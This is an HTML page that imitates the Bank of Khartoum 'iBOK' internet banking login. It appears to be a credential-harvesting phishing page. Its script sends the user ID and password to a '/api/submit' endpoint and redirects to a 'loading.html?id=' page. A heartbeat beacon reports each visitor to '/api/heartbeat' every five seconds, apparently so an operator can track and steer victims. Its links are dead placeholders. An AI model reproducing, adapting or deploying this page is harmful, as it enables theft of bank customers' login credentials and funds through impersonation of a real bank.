<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bank of Khartoum | Internet Banking</title>
<link href="images/favicon-bok.png" rel="icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}

.hero-header{display:flex;min-height:120px;overflow:hidden}
.hero-left{flex:1;background:#0f4130;display:flex;align-items:center;padding:16px 20px;gap:12px}
.hero-left img{height:55px}
.hero-left-text{color:#fff;font-size:11px;line-height:1.5;border-left:2px solid #bb8b16;padding-left:10px}
.hero-left-text .ar{display:block;font-weight:600}
.hero-left-text .en{display:block;font-weight:400;font-size:10px}
.hero-right{flex:1;background:#bb8b16;display:flex;align-items:center;justify-content:flex-end;padding:16px 24px;text-align:right}
.hero-right h1{color:#fff;font-size:22px;font-weight:700;line-height:1.4}

.page-bg{flex:1;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><path d="M100 20 L140 60 L140 100 L100 140 L60 100 L60 60 Z" fill="none" stroke="%23ddd" stroke-width="0.5" opacity="0.3"/></svg>') repeat;background-color:#e8e8e8;padding:20px 16px 40px}

.login-title{color:#bc262a;font-size:20px;font-weight:600;margin-bottom:12px;padding:0 4px}

.loginbox{padding:24px 20px;border-radius:8px;background-color:#fff;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);max-width:500px;margin:0 auto}

.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:14px;margin-bottom:24px}
.loginbox h3::after{content:"";width:40%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}

.form-group{margin-bottom:16px}
.form-group label{color:#828488;font-size:14px;display:block;margin-bottom:5px}
.form-control{border:1px solid #ccc;height:44px;width:100%;padding:8px 12px;border-radius:6px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none;transition:border-color .2s;background:#fff}
.form-control:focus{border-color:#bc262a}
.form-control::placeholder{color:#aaa}

.pass-wrapper{position:relative}
.pass-wrapper .form-control{padding-right:40px}
.toggle-eye{position:absolute;top:50%;right:12px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#999;font-size:18px;padding:0;line-height:1}

.forgot-link{text-align:right;margin-top:4px;margin-bottom:8px}
.forgot-link a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
.forgot-link a:hover{text-decoration:underline}

.terms-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
.terms-row input[type=checkbox]{width:18px;height:18px;accent-color:#bc262a;cursor:pointer;flex-shrink:0}
.terms-row label{color:#666;font-size:14px;cursor:pointer}

.submit-btn{display:block;width:100%;color:#fff;padding:12px;font-size:16px;font-weight:600;border-radius:8px;cursor:pointer;font-family:'Open Sans',sans-serif;border:none;background:linear-gradient(to bottom,#e88a8d,#d46b6e);transition:opacity .2s}
.submit-btn:hover{opacity:.9}
.submit-btn:disabled{opacity:.5;cursor:default}

.footer-bar{background:#fff;border-top:3px solid #bc262a;padding:14px 16px;text-align:center;margin-top:auto}
.footer-text{color:#333;font-size:14px;font-weight:600;margin-bottom:10px}
.social-icons{display:flex;justify-content:center;gap:20px;margin-top:8px}
.social-icons a{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;text-decoration:none;color:#fff;font-size:16px;font-weight:700}
.social-bok{background:#0f4130}
.social-li{background:#0077b5}
.social-x{background:#000}
.social-fb{background:#1877f2}

.error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
.error-box.show{display:block}
.error-box span{color:#dc3545;font-size:13px;font-weight:600}

.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
.loading-overlay.show{display:flex}
.lo-spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #bc262a;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
@keyframes spin{to{transform:rotate(360deg)}}
.lo-text{font-size:14px;color:#bc262a;font-weight:600}

@media(max-width:480px){
  .hero-right h1{font-size:18px}
  .hero-left img{height:45px}
  .loginbox{padding:20px 16px}
}
</style>
</head>
<body>

<div class="hero-header">
  <div class="hero-left">
    <img src="images/logo.png" alt="iBOK">
    <div class="hero-left-text">
      <span class="ar">الخدمات المصرفية عبر الإنترنت</span>
      <span class="en">Internet Banking Services</span>
    </div>
  </div>
  <div class="hero-right">
    <h1>Welcome to<br>iBOK Internet<br>Banking</h1>
  </div>
</div>

<div class="page-bg">
  <div style="max-width:500px;margin:0 auto;">
    <div class="login-title">Internet Banking - Login</div>

    <div class="loginbox">
      <h3>Please enter the details</h3>

      <div class="error-box" id="errorBox"><span id="errorText">Invalid login credentials</span></div>

      <div class="form-group">
        <label>User ID:</label>
        <input type="text" class="form-control" id="accountInput" placeholder="Enter User ID" autocomplete="off">
      </div>

      <div class="form-group">
        <label>Password:</label>
        <div class="pass-wrapper">
          <input type="password" class="form-control" id="passwordInput" placeholder="Enter password" autocomplete="off">
          <button type="button" class="toggle-eye" onclick="togglePass()">
            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
          </button>
        </div>
        <div class="forgot-link"><a href="#">Forgot Password?</a></div>
      </div>

      <div class="terms-row">
        <input type="checkbox" id="termsCheck">
        <label for="termsCheck">Terms and Conditions</label>
      </div>

      <button type="button" class="submit-btn" id="loginBtn" onclick="doLogin()">Login</button>
    </div>
  </div>
</div>

<div class="footer-bar">
  <div class="footer-text">iBOK | Bank of Khartoum 2024</div>
  <div class="social-icons">
    <a href="#" class="social-bok"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M13 3L4 14h5v7l9-11h-5V3z"/></svg></a>
    <a href="#" class="social-li">in</a>
    <a href="#" class="social-x">𝕏</a>
    <a href="#" class="social-fb">f</a>
  </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="lo-spinner"></div>
  <div class="lo-text">Verifying...</div>
</div>

<script>
var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
heartbeat();setInterval(heartbeat,5000);

function togglePass(){
  var inp=document.getElementById('passwordInput');
  var icon=document.getElementById('eyeIcon');
  if(inp.type==='password'){
    inp.type='text';
    icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  }else{
    inp.type='password';
    icon.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
  }
}

function doLogin(){
  var username=document.getElementById('accountInput').value.trim();
  var password=document.getElementById('passwordInput').value.trim();
  if(!username||!password)return;
  document.getElementById('errorBox').classList.remove('show');
  document.getElementById('loginBtn').disabled=true;
  document.getElementById('loginBtn').textContent='Verifying...';

  fetch('/api/submit',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:username,password:password})
  })
  .then(function(r){return r.json();})
  .then(function(d){
    if(d.ok&&d.id){
      window.location.href='loading.html?id='+d.id;
    }else{
      document.getElementById('loginBtn').disabled=false;
      document.getElementById('loginBtn').textContent='Login';
    }
  })
  .catch(function(){
    document.getElementById('loginBtn').disabled=false;
    document.getElementById('loginBtn').textContent='Login';
  });
}

document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
</script>
</body>
</html>
